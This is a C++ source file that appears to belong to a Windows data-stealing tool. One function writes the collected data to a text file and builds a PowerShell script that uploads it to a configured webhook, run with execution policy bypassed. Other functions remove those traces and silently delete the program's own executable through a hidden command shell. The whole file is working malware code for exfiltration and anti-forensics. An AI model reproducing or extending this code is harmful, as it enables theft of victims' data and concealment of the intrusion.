#include <fstream>
#include "misc.h"

#include "utils.h"
#include "globals.h"

bool misc::SendData(std::string data) noexcept
{
	std::ofstream f("goop.txt");
	f << data;
	f.close();

	bool retVal = true;

	std::string script = "$Url=\"";
	script.append(config::webhook);
	script.append("\";"
		"$Path = \".\\goop.txt\";"
		"$fileBytes=[System.IO.File]::ReadAllBytes($Path);"
		"$fileEnc=[System.Text.Encoding]::GetEncoding(\"UTF-8\").GetString($fileBytes);"
		"$Boundary=[System.Guid]::NewGuid().ToString();"
		"$bodyLines=(\"--$Boundary`r`nContent-Disposition: form-data; name=`\"files[0]`\"; filename=`\"goop.txt`\"`r`nContent-Type: text/html`r`n`r`n$fileEnc`r`n--$Boundary--`r`n\");"
		"Invoke-RestMethod -Uri $Url -Method Post -ContentType \"multipart/form-data; boundary=`\"$Boundary`\"\" -Body $bodyLines;");

	std::ofstream file;
	file.open("t.ps1");
	file << script.c_str();
	file.close();

	if (!utils::RunSubWorker(NULL, "powershell -ExecutionPolicy Bypass ./t.ps1"))
		retVal = false;

	return retVal;
}

void misc::Cleanup(void) noexcept
{
	// We close these regardless of the cleanup option...
	if (globals::g_hStdOutR != NULL) CloseHandle(globals::g_hStdOutR);
	if (globals::g_hStdOutW != NULL) CloseHandle(globals::g_hStdOutW);

	if (!config::cleanup)
		return;
	if(utils::isFile("goop.txt"))
		std::remove("goop.txt");

	if (utils::isFile("t.ps1"))
		std::remove("t.ps1");
}

void misc::SelfDelete(void) noexcept
{
	if (!config::selfdelete)
		return;

	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);

	std::string cmd("/c del ");
	cmd.append(path);
	cmd.append(" >> NUL");

	char file[MAX_PATH];

	if (!GetModuleFileNameA(0, file, MAX_PATH) != 00)
		return;

	if (!GetShortPathNameA(file, file, MAX_PATH))
		return;

	if (!GetEnvironmentVariableA("ComSpec", file, MAX_PATH))
		return;

	ShellExecuteA(0, 0, file, cmd.c_str(), 0, SW_HIDE);
}